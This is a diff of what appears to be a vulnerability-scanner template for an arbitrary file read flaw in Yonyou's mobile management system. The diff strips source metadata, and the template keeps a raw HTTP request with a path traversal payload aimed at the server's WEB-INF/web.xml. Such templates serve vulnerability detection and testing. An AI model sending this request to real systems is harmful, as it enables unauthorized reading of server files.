@@ -3,12 +3,8 @@ info:
   name: 用友 移动管理系统 common任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hrpb3io1zfolbgwd'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hrpb3io1zfolbgwd
-    fofa: 暂无
 http:
 - raw:
   - 'GET /mobsm/common/download?path=\..\webapps\nc_web\WEB-INF\web.xml HTTP/1.1
